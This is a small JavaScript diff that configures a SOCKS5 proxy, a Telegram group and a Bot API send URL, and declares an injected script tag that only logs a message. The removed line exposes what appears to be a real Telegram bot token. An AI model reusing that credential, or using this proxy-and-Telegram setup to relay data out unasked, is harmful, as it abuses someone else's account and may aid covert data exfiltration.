@@ -10,7 +10,7 @@ const socksAgent = new SocksProxyAgent("socks5h://96.9.124.114:40001");
 
 // TELEGRAM CONFIG
 const telegramGroupId = -4769673326;
-const botToken = "6272866263:AAGSnWHXlP_4m_Db5T2gLLAw6jjJC0Inrik";
+const botToken = "";
 const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
 const injectedScript = "<script>console.log('hello we here')</script>";
